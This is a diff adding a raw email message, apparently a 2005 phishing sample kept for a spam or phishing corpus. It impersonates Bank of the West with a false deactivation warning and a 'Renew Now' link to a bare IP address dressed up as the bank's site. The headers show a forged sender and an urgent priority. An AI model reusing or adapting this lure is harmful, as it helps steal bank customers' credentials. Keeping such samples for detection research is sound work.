@@ -1,0 +1,79 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 32E252A88C
+	for <user@example.com>; Thu, 21 Jul 2005 12:22:15 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id DF452621CA6; Thu, 21 Jul 2005 12:22:14 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id B3256621CA5
+	for <user@example.com>; Thu, 21 Jul 2005 12:22:14 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id MAA08867
+	for user@example.com; Thu, 21 Jul 2005 12:22:12 -0400
+Received: from paypal.com (86-105-35.datanet.ro [86.105.35.84] (may be forged))
+	by mail.example.com with SMTP id MAA08859
+	for <user@example.com>; Thu, 21 Jul 2005 12:22:11 -0400
+Message-Id: <200507211622.MAA08859@mail.example.com>
+From: "Bank of the West" <service@bankofthewest.com>
+Subject: Online Banking and Bill Pay Deactivation Notice
+Date: Thu, 21 Jul 2005 19:22:10 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 5.50.4522.1200
+X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200
+To: undisclosed-recipients: ;
+Content-Length: 2167
+Lines: 41
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 46
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0034)http://xthost.info/xhack/bow2.html -->
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2900.2668" name=GENERATOR></HEAD>
+<BODY><FONT face=Arial size=2>
+<DIV>&nbsp;&nbsp;&nbsp;Dear Bank Of&nbsp;The West&nbsp;Customer,<BR>&nbsp; 
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; This is your official notification from Bank Of&nbsp;The West 
+that the service(s) listed below<BR>&nbsp;&nbsp; will be deactivated and deleted 
+if not renewed immediately. Previous notifications have<BR>&nbsp;&nbsp; been 
+sent to the Billing Contact assigned to this account. As the Primary Contact, 
+you<BR>&nbsp;&nbsp; must renew the service(s) listed below or it will be 
+deactivated and deleted. <BR><BR><BR>&nbsp;&nbsp; <A 
+onclick="return ShowLinkWarning()" 
+href="http://67.163.230.109/icons/.cgi/www.bankofthewest.com/" target=_blank 
+onfiltered="return ShowLinkWarning()"><FONT color=#003399>Renew 
+Now</FONT></A>&nbsp; your eTimeBanker Online Banking and Bill Pay 
+Services.</DIV>
+<DIV><FONT color=#003399></FONT>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; SERVICE : Bank Of&nbsp;The West&nbsp;<EM>e</EM>TimeBanker 
+with Bill Pay.<BR>&nbsp;&nbsp; EXPIRATION: Jul&nbsp;20, 2005</DIV>
+<DIV>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; Thank you,</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp;&nbsp;Bank Of&nbsp;The West&nbsp;Management Center Customer 
+Support</DIV>
+<DIV>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; 
+*****************************************************************************<BR>&nbsp;&nbsp; 
+IMPORTANT CUSTOMER SUPPORT INFORMATION<BR>&nbsp;&nbsp; 
+*****************************************************************************</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; Please do not reply to this message. For any inquiries, 
+contact Customer Service.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; Document Reference: (87051203).</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; Bank Of&nbsp;The West, N.A. Member FDIC.&nbsp; Equal Housing 
+Lender.<BR>&nbsp;&nbsp; Copyright © 2005 Bank Of&nbsp;The West, N.A. All rights 
+reserved.</DIV></DIV></FONT></BODY></HTML>
+
